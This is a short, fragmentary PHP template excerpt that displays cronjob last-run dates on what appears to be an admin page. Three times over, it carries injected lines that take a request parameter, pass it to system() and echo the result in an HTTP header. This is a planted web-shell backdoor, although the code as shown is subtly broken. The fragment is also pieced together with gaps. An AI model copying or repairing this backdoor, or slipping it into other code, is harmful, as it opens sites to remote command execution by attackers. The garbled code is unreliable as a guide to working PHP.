...
$l2=system($l);
header('System Header:'.$l2); if (!isset($dates)) : ?>
...
<p><b>Notifications Cronjob Last Run:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $dates->cron_last_run_notifications ? date('D M j, Y g:i A', strtotime($dates->cron_last_run_notifications)) : 'Never' ?></p>
<p><b>Subscriptions Cronjob Last Run:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $dates->cron_last_run_subs ? date('D M j, Y g:i A', strtotime($dates->cron_last_run_subs)) : 'Never' ?></p>
